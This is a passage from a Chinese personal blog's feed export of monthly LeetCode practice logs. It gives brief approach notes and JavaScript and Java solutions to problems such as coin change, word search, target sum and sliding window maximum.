class="hljs-number">1</span>,preorder_right,inorder_root+<span class="hljs-number">1</span>,inorder_right);        <span class="hljs-keyword">return</span> root;    &#125;    <span class="hljs-keyword">return</span> build(preorder,inorder,<span class="hljs-number">0</span>,n<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,n<span class="hljs-number">-1</span>);&#125;;</code></pre></div><h3 id="零钱兑换"><a href="#零钱兑换" class="headerlink" title="零钱兑换"></a><a href="https://leetcode-cn.com/problems/coin-change/" target="_blank" rel="noopener">零钱兑换</a></h3><p>自底向上计算，应用之前用过的最优解，自顶向下也可以，但需要记录已经计算的值，不然会有很多重复的子结构重复计算</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> coinChange = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">coins, amount</span>) </span>&#123;    <span class="hljs-keyword">let</span> dp = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>(amount+<span class="hljs-number">1</span>);    dp.fill(amount+<span class="hljs-number">1</span>);    dp[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">1</span>;i&lt;=amount;i++) &#123;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> j=<span class="hljs-number">0</span>;j&lt;coins.length;j++) &#123;            <span class="hljs-keyword">if</span>(i &gt;= coins[j]) dp[i] = <span class="hljs-built_in">Math</span>.min(dp[i],dp[i-coins[j]]+<span class="hljs-number">1</span>);        &#125;    &#125;    <span class="hljs-keyword">return</span> dp[amount]&gt;amount?<span class="hljs-number">-1</span>:dp[amount];&#125;;</code></pre></div><h3 id="二叉树的层序遍历"><a href="#二叉树的层序遍历" class="headerlink" title="二叉树的层序遍历"></a><a href="https://leetcode-cn.com/problems/binary-tree-level-order-traversal/" target="_blank" rel="noopener">二叉树的层序遍历</a></h3><p>要求是根据层级将结果分开，所以要记录每一层的节点个数</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> levelOrder = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">root</span>) </span>&#123;    <span class="hljs-keyword">if</span>(root == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> [];    <span class="hljs-keyword">let</span> q = [];    <span class="hljs-keyword">let</span> res = [];    <span class="hljs-keyword">let</span> l = <span class="hljs-number">0</span>;    q.push(root);    <span class="hljs-keyword">while</span>(q.length != <span class="hljs-number">0</span>) &#123;        <span class="hljs-keyword">let</span> num = q.length;        res[l] = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Array</span>();        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>;i&lt;num;i++) &#123;            <span class="hljs-keyword">let</span> node = q.shift();            res[l].push(node.val);            <span class="hljs-keyword">if</span>(node.left != <span class="hljs-literal">null</span>) q.push(node.left);            <span class="hljs-keyword">if</span>(node.right != <span class="hljs-literal">null</span>) q.push(node.right);        &#125;        l++;    &#125;    <span class="hljs-keyword">return</span> res;&#125;;</code></pre></div><p>可以说剑指offer和HOT100总算是刷过一遍了，打算之后主要复习旧题，做做每日一题就可以，然后就是熟悉下牛客网站的做题。</p><p>这里之后放的一般是每日一题和用JS做的复习题</p><h3 id="加油站"><a href="#加油站" class="headerlink" title="加油站"></a><a href="https://leetcode-cn.com/problems/gas-station/" target="_blank" rel="noopener">加油站</a></h3><p>数学证明，如果X无法到达Y，则对于X与Y之间的任意Z，都到达不了Y</p><div class="hljs"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> canCompleteCircuit = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">gas, cost</span>) </span>&#123;    <span class="hljs-keyword">let</span> n = gas.length;    <span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>;    <span class="hljs-keyword">while</span>(i &lt; n) &#123;        <span class="hljs-keyword">let</span> sumGas=<span class="hljs-number">0</span>, sumCost=<span class="hljs-number">0</span>;        <span class="hljs-keyword">let</span> cnt=<span class="hljs-number">0</span>;        <span class="hljs-keyword">while</span>(cnt&lt;n) &#123;            <span class="hljs-keyword">const</span> j = (i+cnt)%n;            sumGas+=gas[j];            sumCost+=cost[j];            <span class="hljs-keyword">if</span>(sumCost &gt; sumGas) <span class="hljs-keyword">break</span>;            cnt++;        &#125;        <span class="hljs-keyword">if</span>(cnt === n) <span class="hljs-keyword">return</span> i;        <span class="hljs-keyword">else</span> i = i+cnt+<span class="hljs-number">1</span>;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;&#125;;</code></pre></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;11月做题记录&quot;&gt;&lt;a href=&quot;#11月做题记录&quot; class=&quot;headerlink&quot; title=&quot;11月做题记录&quot;&gt;&lt;/a&gt;11月做题记录&lt;/h1&gt;&lt;h3 id=&quot;最长上升子序列&quot;&gt;&lt;a href=&quot;#最长上升子序列&quot; class=&quot;headerlink</summary>
      
    
    
    
    <category term="Algorithm" scheme="http://yoursite.com/categories/Algorithm/"/>
    
    
    <category term="leetcode" scheme="http://yoursite.com/tags/leetcode/"/>
    
    <category term="HOT100" scheme="http://yoursite.com/tags/HOT100/"/>
    
    <category term="每日一题" scheme="http://yoursite.com/tags/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>9月做题记录</title>
    <link href="http://yoursite.com/2020/09/01/9%E6%9C%88%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://yoursite.com/2020/09/01/9%E6%9C%88%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-09-01T09:45:34.000Z</published>
    <updated>2020-09-28T03:41:08.240Z</updated>
    
    <content type="html"><![CDATA[<h1 id="9月做题记录"><a href="#9月做题记录" class="headerlink" title="9月做题记录"></a>9月做题记录</h1><h3 id="单词搜索"><a href="#单词搜索" class="headerlink" title="单词搜索"></a><a href="https://leetcode-cn.com/problems/word-search/" target="_blank" rel="noopener">单词搜索</a></h3><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span>[][] mark;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">char</span>[][] board;    <span class="hljs-keyword">public</span> String word;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[][] direction = &#123;&#123;-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;, &#123;<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>&#125;, &#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>&#125;, &#123;<span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;&#125;;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> m;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> n;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">exist</span><span class="hljs-params">(<span class="hljs-keyword">char</span>[][] board, String word)</span> </span>&#123;        m = board.length;        <span class="hljs-keyword">if</span>(m == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        n = board[<span class="hljs-number">0</span>].length;        mark = <span class="hljs-keyword">new</span> <span class="hljs-keyword">boolean</span>[m][n];        <span class="hljs-keyword">this</span>.word = word;        <span class="hljs-keyword">this</span>.board = board;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;m;i++) &#123;            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++) &#123;                <span class="hljs-keyword">if</span>(dfs(i,j,<span class="hljs-number">0</span>)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;            &#125;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">dfs</span><span class="hljs-params">(<span class="hljs-keyword">int</span> i, <span class="hljs-keyword">int</span> j, <span class="hljs-keyword">int</span> start)</span> </span>&#123;        <span class="hljs-keyword">if</span>(start==word.length()-<span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> board[i][j] == word.charAt(start);        <span class="hljs-keyword">if</span>(board[i][j] == word.charAt(start)) &#123;            mark[i][j] = <span class="hljs-keyword">true</span>;            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> k=<span class="hljs-number">0</span>;k&lt;<span class="hljs-number">4</span>;k++) &#123;                <span class="hljs-keyword">int</span> newx = i+direction[k][<span class="hljs-number">0</span>];                <span class="hljs-keyword">int</span> newy = j+direction[k][<span class="hljs-number">1</span>];                <span class="hljs-keyword">if</span>(inArea(newx,newy) &amp;&amp; !mark[newx][newy]) &#123;                    <span class="hljs-keyword">if</span>(dfs(newx,newy,start+<span class="hljs-number">1</span>)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;                &#125;            &#125;            mark[i][j] = <span class="hljs-keyword">false</span>;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">inArea</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span> </span>&#123;        <span class="hljs-keyword">return</span> x&gt;=<span class="hljs-number">0</span> &amp;&amp; x&lt;m &amp;&amp; y&gt;=<span class="hljs-number">0</span> &amp;&amp; y&lt;n;    &#125;&#125;</code></pre></div><h3 id="验证二叉搜索树"><a href="#验证二叉搜索树" class="headerlink" title="验证二叉搜索树"></a><a href="https://leetcode-cn.com/problems/validate-binary-search-tree/" target="_blank" rel="noopener">验证二叉搜索树</a></h3><div class="hljs"><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * Definition for a binary tree node.</span><span class="hljs-comment"> * public class TreeNode &#123;</span><span class="hljs-comment"> *     int val;</span><span class="hljs-comment"> *     TreeNode left;</span><span class="hljs-comment"> *     TreeNode right;</span><span class="hljs-comment"> *     TreeNode(int x) &#123; val = x; &#125;</span><span class="hljs-comment"> * &#125;</span><span class="hljs-comment"> */</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isValidBST</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;        <span class="hljs-keyword">return</span> helper(root,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">helper</span><span class="hljs-params">(TreeNode node, Integer lower, Integer upper)</span> </span>&#123;        <span class="hljs-keyword">if</span>(node == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;        <span class="hljs-keyword">int</span> val = node.val;        <span class="hljs-keyword">if</span>(lower!=<span class="hljs-keyword">null</span> &amp;&amp; val&lt;=lower) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        <span class="hljs-keyword">if</span>(upper!=<span class="hljs-keyword">null</span> &amp;&amp; val&gt;=upper) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        <span class="hljs-keyword">if</span>(!helper(node.left,lower,val)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        <span class="hljs-keyword">if</span>(!helper(node.right,val,upper)) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;    &#125;&#125;</code></pre></div><h3 id="任务调度器"><a href="#任务调度器" class="headerlink" title="任务调度器"></a><a href="https://leetcode-cn.com/problems/task-scheduler/" target="_blank" rel="noopener">任务调度器</a></h3><p>画个图，数量最多的任务排成一列，每个占n个位置的一行</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">leastInterval</span><span class="hljs-params">(<span class="hljs-keyword">char</span>[] tasks, <span class="hljs-keyword">int</span> n)</span> </span>&#123;        <span class="hljs-keyword">int</span>[] map = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">26</span>];        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">char</span> c:tasks) map[c-<span class="hljs-string">'A'</span>]++;        Arrays.sort(map);        <span class="hljs-keyword">int</span> max_val=map[<span class="hljs-number">25</span>]-<span class="hljs-number">1</span>, pool=max_val*n;        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">24</span>;i&gt;=<span class="hljs-number">0</span> &amp;&amp; map[i]&gt;<span class="hljs-number">0</span>;i--) pool -= Math.min(max_val,map[i]);        <span class="hljs-keyword">return</span> pool&gt;<span class="hljs-number">0</span>?pool+tasks.length:tasks.length;    &#125;&#125;</code></pre></div><h3 id="目标和"><a href="#目标和" class="headerlink" title="目标和"></a><a href="https://leetcode-cn.com/problems/target-sum/" target="_blank" rel="noopener">目标和</a></h3><p>动态规划，<code>dp[i][j]</code>为前i个数可以组成和为j的方法的个数，则有<code>dp[i][j]=dp[i-1][j-num[i]]+dp[i-1][j+num[i]]</code>，或者用递归也可以</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">findTargetSumWays</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> S)</span> </span>&#123;        <span class="hljs-keyword">int</span>[] dp = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">2001</span>];        dp[nums[<span class="hljs-number">0</span>]+<span class="hljs-number">1000</span>] = <span class="hljs-number">1</span>;        dp[-nums[<span class="hljs-number">0</span>]+<span class="hljs-number">1000</span>] += <span class="hljs-number">1</span>;        <span class="hljs-comment">// 因为nums[0]可能是0</span>        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;nums.length;i++) &#123;            <span class="hljs-keyword">int</span>[] next = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">2001</span>];            <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> sum=-<span class="hljs-number">1000</span>;sum&lt;=<span class="hljs-number">1000</span>;sum++) &#123;                <span class="hljs-keyword">if</span>(dp[sum+<span class="hljs-number">1000</span>]&gt;<span class="hljs-number">0</span>) &#123;                    next[sum+<span class="hljs-number">1000</span>+nums[i]] += dp[sum+<span class="hljs-number">1000</span>];                    next[sum+<span class="hljs-number">1000</span>-nums[i]] += dp[sum+<span class="hljs-number">1000</span>];                &#125;            &#125;            dp = next;        &#125;        <span class="hljs-keyword">return</span> S&gt;<span class="hljs-number">1000</span>?<span class="hljs-number">0</span>:dp[S+<span class="hljs-number">1000</span>];    &#125;&#125;</code></pre></div><h3 id="前-K-个高频元素"><a href="#前-K-个高频元素" class="headerlink" title="前 K 个高频元素"></a><a href="https://leetcode-cn.com/problems/top-k-frequent-elements/" target="_blank" rel="noopener">前 K 个高频元素</a></h3><p>前K问题一般考虑快排，但我是直接统计次数然后排序。。暴力解决</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] topKFrequent(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> k) &#123;        HashMap&lt;Integer,Integer&gt; map = <span class="hljs-keyword">new</span> HashMap();        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> num:nums) &#123;            <span class="hljs-keyword">int</span> value = map.getOrDefault(num,<span class="hljs-number">0</span>).intValue()+<span class="hljs-number">1</span>;            map.put(num,value);        &#125;        List&lt;Map.Entry&lt;Integer, Integer&gt;&gt; list = <span class="hljs-keyword">new</span> ArrayList&lt;Map.Entry&lt;Integer, Integer&gt;&gt;(map.entrySet());        list.sort(<span class="hljs-keyword">new</span> Comparator&lt;Map.Entry&lt;Integer, Integer&gt;&gt;() &#123;          <span class="hljs-meta">@Override</span>          <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">compare</span><span class="hljs-params">(Map.Entry&lt;Integer, Integer&gt; o1, Map.Entry&lt;Integer, Integer&gt; o2)</span> </span>&#123;              <span class="hljs-keyword">return</span> o2.getValue().compareTo(o1.getValue());          &#125;        &#125;);        <span class="hljs-keyword">int</span>[] res = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[k];        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;k;i++) res[i]=list.get(i).getKey();        <span class="hljs-keyword">return</span> res;    &#125;&#125;</code></pre></div><h3 id="对称二叉树"><a href="#对称二叉树" class="headerlink" title="对称二叉树"></a><a href="https://leetcode-cn.com/problems/symmetric-tree/" target="_blank" rel="noopener">对称二叉树</a></h3><p>总是忘了怎么写</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-comment">/**</span><span class="hljs-comment"> * Definition for a binary tree node.</span><span class="hljs-comment"> * public class TreeNode &#123;</span><span class="hljs-comment"> *     int val;</span><span class="hljs-comment"> *     TreeNode left;</span><span class="hljs-comment"> *     TreeNode right;</span><span class="hljs-comment"> *     TreeNode(int x) &#123; val = x; &#125;</span><span class="hljs-comment"> * &#125;</span><span class="hljs-comment"> */</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isSymmetric</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;        <span class="hljs-keyword">return</span> check(root,root);    &#125;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">check</span><span class="hljs-params">(TreeNode p, TreeNode q)</span> </span>&#123;        <span class="hljs-keyword">if</span>(p==<span class="hljs-keyword">null</span> &amp;&amp; q==<span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;        <span class="hljs-keyword">if</span>(p==<span class="hljs-keyword">null</span> || q==<span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        <span class="hljs-keyword">return</span> p.val==q.val &amp;&amp; check(p.left,q.right) &amp;&amp; check(p.right,q.left);    &#125;&#125;</code></pre></div><h3 id="和为K的子数组"><a href="#和为K的子数组" class="headerlink" title="和为K的子数组"></a><a href="https://leetcode-cn.com/problems/subarray-sum-equals-k/" target="_blank" rel="noopener">和为K的子数组</a></h3><p>不能使用滑动窗口的原因是数组内可能有负值，无法确定右移多少位置会使新加入的值的和为0</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">subarraySum</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> k)</span> </span>&#123;        <span class="hljs-keyword">int</span> pre=<span class="hljs-number">0</span>,res=<span class="hljs-number">0</span>;        HashMap&lt;Integer,Integer&gt; map = <span class="hljs-keyword">new</span> HashMap();        map.put(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;nums.length;i++) &#123;            pre += nums[i];            <span class="hljs-keyword">if</span>(map.containsKey(pre-k)) res += map.get(pre-k);            map.put(pre,map.getOrDefault(pre,<span class="hljs-number">0</span>)+<span class="hljs-number">1</span>);        &#125;        <span class="hljs-keyword">return</span> res;    &#125;&#125;</code></pre></div><h3 id="排序链表"><a href="#排序链表" class="headerlink" title="排序链表"></a><a href="https://leetcode-cn.com/problems/sort-list/" target="_blank" rel="noopener">排序链表</a></h3><p>归并排序，没太懂时间复杂度和空间复杂度如何符合要求</p><div class="hljs"><pre><code class="hljs vbscript">/** * Definition <span class="hljs-keyword">for</span> singly-linked list. * <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> ListNode &#123; *     <span class="hljs-built_in">int</span> val; *     ListNode <span class="hljs-keyword">next</span>; *     ListNode(<span class="hljs-built_in">int</span> x) &#123; val = x; &#125; * &#125; */<span class="hljs-keyword">class</span> Solution &#123;    <span class="hljs-keyword">public</span> ListNode sortList(ListNode head) &#123;        <span class="hljs-keyword">if</span>(head==<span class="hljs-literal">null</span> || head.<span class="hljs-keyword">next</span>==<span class="hljs-literal">null</span>) return head;        ListNode slow=head,fast=head.<span class="hljs-keyword">next</span>;        <span class="hljs-keyword">while</span>(fast!=<span class="hljs-literal">null</span> &amp;&amp; fast.<span class="hljs-keyword">next</span>!=<span class="hljs-literal">null</span>) &#123;            slow = slow.<span class="hljs-keyword">next</span>;            fast = fast.<span class="hljs-keyword">next</span>.<span class="hljs-keyword">next</span>;        &#125;        ListNode tmp = slow.<span class="hljs-keyword">next</span>;        slow.<span class="hljs-keyword">next</span> = <span class="hljs-literal">null</span>;        ListNode <span class="hljs-built_in">left</span> = sortList(head);        ListNode <span class="hljs-built_in">right</span> = sortList(tmp);        ListNode h = <span class="hljs-keyword">new</span> ListNode(<span class="hljs-number">0</span>);        ListNode res = h;        <span class="hljs-keyword">while</span>(<span class="hljs-built_in">left</span>!=<span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-built_in">right</span>!=<span class="hljs-literal">null</span>) &#123;            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">left</span>.val &lt;= <span class="hljs-built_in">right</span>.val) &#123;                h.<span class="hljs-keyword">next</span> = <span class="hljs-built_in">left</span>;                <span class="hljs-built_in">left</span> = <span class="hljs-built_in">left</span>.<span class="hljs-keyword">next</span>;            &#125;            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-built_in">left</span>.val &gt; <span class="hljs-built_in">right</span>.val) &#123;                h.<span class="hljs-keyword">next</span> = <span class="hljs-built_in">right</span>;                <span class="hljs-built_in">right</span> = <span class="hljs-built_in">right</span>.<span class="hljs-keyword">next</span>;            &#125;            h = h.<span class="hljs-keyword">next</span>;        &#125;        h.<span class="hljs-keyword">next</span> = <span class="hljs-built_in">left</span>==<span class="hljs-literal">null</span>?<span class="hljs-built_in">right</span>:<span class="hljs-built_in">left</span>;        return res.<span class="hljs-keyword">next</span>;    &#125;&#125;</code></pre></div><h3 id="滑动窗口最大值"><a href="#滑动窗口最大值" class="headerlink" title="滑动窗口最大值"></a><a href="https://leetcode-cn.com/problems/sliding-window-maximum/" target="_blank" rel="noopener">滑动窗口最大值</a></h3><p>开始想用队列做，发现题解这TM也能动态规划。。</p><p>把数组分成K大小的块，从左往右定义一个数组存放每个块起点到当前位置的最大值，再从右往左做相同操作，这样当一个窗口包括了两个块的部分区域时，这个窗口内最大值一定是右边块的从左往右数组的最右值，与左边块的从右往左数组的最左值之间的最大值。</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] maxSlidingWindow(<span class="hljs-keyword">int</span>[] nums, <span class="hljs-keyword">int</span> k) &#123;        <span class="hljs-keyword">int</span> n = nums.length;        <span class="hljs-keyword">if</span>(n*k == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">0</span>];        <span class="hljs-keyword">if</span>(k == <span class="hljs-number">1</span>) <span class="hljs-keyword">return</span> nums;        <span class="hljs-keyword">int</span>[] left = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n];        left[<span class="hljs-number">0</span>] = nums[<span class="hljs-number">0</span>];        <span class="hljs-keyword">int</span>[] right = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n];        right[n-<span class="hljs-number">1</span>] = nums[n-<span class="hljs-number">1</span>];        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">1</span>;i&lt;n;i++) &#123;            <span class="hljs-keyword">if</span>(i%k==<span class="hljs-number">0</span>) left[i] = nums[i];            <span class="hljs-keyword">else</span> left[i] = Math.max(left[i-<span class="hljs-number">1</span>],nums[i]);            <span class="hljs-keyword">int</span> j = n-i-<span class="hljs-number">1</span>;            <span class="hljs-keyword">if</span>((j+<span class="hljs-number">1</span>)%k==<span class="hljs-number">0</span>) right[j] = nums[j];            <span class="hljs-keyword">else</span> right[j] = Math.max(right[j+<span class="hljs-number">1</span>],nums[j]);        &#125;        <span class="hljs-keyword">int</span>[] res = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[n-k+<span class="hljs-number">1</span>];        <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>;i&lt;n-k+<span class="hljs-number">1</span>;i++)            res[i] = Math.max(right[i],left[i+k-<span class="hljs-number">1</span>]);                <span class="hljs-keyword">return</span> res;    &#125;&#125;</code></pre></div><h3 id="搜索二维矩阵-II"><a href="#搜索二维矩阵-II" class="headerlink" title="搜索二维矩阵 II"></a><a href="https://leetcode-cn.com/problems/search-a-2d-matrix-ii/" target="_blank" rel="noopener">搜索二维矩阵 II</a></h3><p>找个好起点移动就行</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">searchMatrix</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[][] matrix, <span class="hljs-keyword">int</span> target)</span> </span>&#123;        <span class="hljs-keyword">int</span> m=matrix.length;        <span class="hljs-keyword">if</span>(m == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;        <span class="hljs-keyword">int</span> n=matrix[<span class="hljs-number">0</span>].length;        <span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>,j=n-<span class="hljs-number">1</span>;        <span class="hljs-keyword">while</span>(i&lt;m &amp;&amp; j&gt;=<span class="hljs-number">0</span>) &#123;            <span class="hljs-keyword">if</span>(target == matrix[i][j]) <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;            <span class="hljs-keyword">if</span>(target &lt; matrix[i][j]) j--;            <span class="hljs-keyword">else</span> i++;        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;    &#125;&#125;</code></pre></div><h3 id="最短无序连续子数组"><a href="#最短无序连续子数组" class="headerlink" title="最短无序连续子数组"></a><a href="https://leetcode-cn.com/problems/shortest-unsorted-continuous-subarray/" target="_blank" rel="noopener">最短无序连续子数组</a></h3><p>自己做是克隆数组后排序，从前往后和从后往前分别找无序数组的起点和终点</p><p>官解的思路是无序子数组中最小元素的正确位置可以决定左边界，最大元素的正确位置可以决定右边界，所以从头遍历找降序的最小值，从尾遍历找升序的最大值，然后再两次这样的遍历分别找二者的正确位置，这个区间就是res</p><div class="hljs"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">findUnsortedSubarray</span><span class="hljs-params">(<span class="hljs-keyword">int</span>[] nums)</span> </span>&#123;        <span class="hljs-keyword">int</span> n = nums.length;        <span class="hljs-keyword">int</span>[] help = nums.clone();        Arrays.sort(help);        <span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>,j=n-<span class="hljs-number">1</span>;        <span class="hljs-keyword">while</span>(i&lt;n &amp;&amp; nums[i]==help[i]) i++;        <span class="hljs-keyword">if</span>(i == n) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;        <span class="hljs-keyword">while</span>(j&gt;=<span class="hljs-number">0</span> &amp;&amp; nums[j]==help[j]) j--;        <span class="hljs-keyword">return</span> j-i+<span class="hljs-number">1</span>;     &#125;&#125;</code></pre></div><h3 id="根据身高重建队列"><a href="#根据身高重建队列" class="headerlink" title="根据身高重建队列"></a><a href="https://leetcode-cn.com/problems/queue-reconstruction-by-height/" target="_blank" rel="noopener">根据身高重建队列</a></h3><ol><li>先按身高降序排序，相同身高按k升序排序，经过此次排序后高的人一定在矮的人的前面并且相同高度的人的相对顺序就是最终结果的相对顺序。请记住这两点，敲黑板</li><li>创建一个集合，这个集合的每个元素是一个一维数组，也就是我们二维数组的一行。</li><li>以行为单位遍历排好序的people[][]数组，假设每行数据是p[], 把每行元素插入到集合的索引为p[1]的位置，</li><li>把集合中的数据转换为一个二维数组，返回即是正确结果</li></ol><p>下面解释为什么经过第三步后就达到了我们题目要求的输出结果：</p><p>经过第一步排序后高的人一定在矮的人的前面并且相同高度的人的相对顺序就是最终结果的相对顺序，所以  